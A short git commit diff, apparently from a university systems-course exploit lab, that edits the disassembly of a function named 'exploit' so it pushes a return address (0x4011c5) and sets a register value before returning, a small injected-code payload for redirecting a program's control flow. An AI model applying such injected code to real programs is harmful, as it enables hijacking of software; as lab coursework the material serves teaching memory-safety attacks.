3a91e97bb796d292de2339e71e65ec85779bc02c
Mikayla Walsh <mwalsh16@cs.brown.edu>
2022-10-10 23:40:09 -0400

    8

--- lost.d
+++ lost.d
@@ -5,5 +5,6 @@ lost.o:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <exploit>:
-   0:	48 c7 c0 ed 24 25 62 	mov    $0x622524ed,%rax
-   7:	c3                   	retq   
+   0:	68 c5 11 40 00       	pushq  $0x4011c5
+   5:	48 c7 c0 ed 24 25 62 	mov    $0x622524ed,%rax
+   c:	c3                   	retq   
